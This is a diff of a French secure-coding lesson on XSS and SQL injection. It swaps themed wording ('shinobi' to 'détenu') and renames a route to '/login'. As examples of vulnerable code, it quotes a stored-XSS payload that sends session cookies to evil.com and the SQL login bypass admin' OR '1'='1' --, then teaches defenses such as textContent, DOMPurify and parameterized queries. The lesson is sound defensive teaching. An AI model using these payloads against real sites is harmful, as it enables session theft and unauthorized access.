@@ -1,7 +1,7 @@
 # XSS ET INJECTION SQL
 Temps de lecture ~9 min
 
-T-Bag a trouvé une faille dans ton formulaire. Il a injecté du JavaScript dans ton champ "prénom" et maintenant il lit les cookies de session de tous tes shinobis. Ce scénario arrive en prod tous les jours.
+T-Bag a trouvé une faille dans ton formulaire. Il a injecté du JavaScript dans ton champ "prénom" et maintenant il lit les cookies de session de tous tes détenus. Ce scénario arrive en prod tous les jours.
 
 XSS (Cross-Site Scripting : injection de script côté client) et SQL Injection sont les deux attaques qui touchent le plus d'apps réelles. Pas parce que les devs sont nuls, mais parce que c'est invisible quand tu codes vite.
 
@@ -21,7 +21,7 @@ Le navigateur fait confiance au contenu qui vient de ton domaine. Si ton serveur
 
 ```
 Reflected XSS  --> l'input malveillant est dans l'URL, renvoyé direct dans la réponse
-Stored XSS   --> l'input est sauvegardé en DB, puis affiché à d'autres shinobis
+Stored XSS   --> l'input est sauvegardé en DB, puis affiché à d'autres détenus
 DOM-based XSS  --> le JS côté client manipule le DOM depuis une source non fiable (URL, postMessage)
 ```
 
@@ -30,8 +30,8 @@ Stored XSS est le plus dangereux : un attaquant poste un commentaire une fois, e
 ### Exemple qui casse
 
 ```js
-// Scénario : afficher le nom d'un shinobi dans la page
-// Le shinobi s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+// Scénario : afficher le nom d'un détenu dans la page
+// Le détenu s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
 
 const username = getUserFromDB(); // retourne la chaîne malveillante
 document.getElementById('welcome').innerHTML = `Bonjour ${username}`; // CATASTROPHE
@@ -79,7 +79,7 @@ element.innerHTML = userInput; // XSS si userInput contient du HTML
 element.textContent = userInput; // affiché tel quel, jamais exécuté
 ```
 
-Pour les cas où tu dois afficher du HTML shinobi (éditeur riche, commentaires formatés) : utilise **DOMPurify** qui assainit (sanitize : nettoyer les éléments dangereux) le HTML sans tout bloquer.
+Pour les cas où tu dois afficher du HTML détenu (éditeur riche, commentaires formatés) : utilise **DOMPurify** qui assainit (sanitize : nettoyer les éléments dangereux) le HTML sans tout bloquer.
 
 ```js
 import DOMPurify from 'dompurify';
@@ -111,7 +111,7 @@ SQL Injection : l'attaquant insère du SQL dans un champ de formulaire. Si tu co
 
 ```js
 // Chakra_gate classique SANS protection
-app.post('/chakra_gate', async (req, res) => {
+app.post('/login', async (req, res) => {
  const { username, password } = req.body;
 
  // L'attaquant entre comme username : admin' OR '1'='1' --
@@ -134,7 +134,7 @@ app.post('/chakra_gate', async (req, res) => {
 
 ```js
 // Avec paramètres : le driver SQL sépare le code des données
-app.post('/chakra_gate', async (req, res) => {
+app.post('/login', async (req, res) => {
  const { username, password } = req.body;
 
  // $1 et $2 sont des placeholders : pg envoie la requête et les valeurs séparément
@@ -203,7 +203,7 @@ Contrainte : les `<b>`, `<i>`, `<a href>` légitimes doivent survivre. Les `<scr
 
 ## RÉSUMÉ
 
-XSS et SQL Injection partagent la même logique : de la data shinobi qui se retrouve interprétée comme du code. La défense est aussi la même : ne jamais mélanger code et data, toujours séparer les deux avant l'exécution. Pour XSS : `textContent` ou DOMPurify. Pour SQL : paramètres liés, toujours. La sanitization n'est pas une option de dernier recours : c'est la baseline minimum avant de mettre quoi que ce soit en prod.
+XSS et SQL Injection partagent la même logique : de la data détenu qui se retrouve interprétée comme du code. La défense est aussi la même : ne jamais mélanger code et data, toujours séparer les deux avant l'exécution. Pour XSS : `textContent` ou DOMPurify. Pour SQL : paramètres liés, toujours. La sanitization n'est pas une option de dernier recours : c'est la baseline minimum avant de mettre quoi que ce soit en prod.
 
 ---
 stability: stable
